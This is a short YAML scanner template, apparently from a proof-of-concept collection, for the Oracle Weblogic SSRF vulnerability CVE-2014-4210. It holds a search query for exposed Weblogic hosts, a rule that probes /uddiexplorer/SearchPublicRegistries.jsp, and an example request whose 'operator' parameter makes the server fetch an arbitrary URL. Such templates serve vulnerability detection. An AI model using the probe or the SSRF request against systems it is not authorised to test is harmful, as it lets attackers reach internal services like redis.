name: Weblogic SSRF漏洞 CVE-2014-4210
manual: true
query: app="Oracle-Weblogic_interface_7001" || app="Oracle-BEA-WebLogic-Server" ||
  title=="Error 404--Not Found"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /uddiexplorer/SearchPublicRegistries.jsp
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"Search")
expression: r0()
detail:
  author: PeiQi
  links:
  - http://wiki.peiqi.tech
  description: |-
    Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性

    Oracle WebLogic Server 10.0.2.0
    Oracle WebLogic Server 10.3.6.0

    http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://xxx.xxx.xxx.xxx:7001
  tags: SSRF
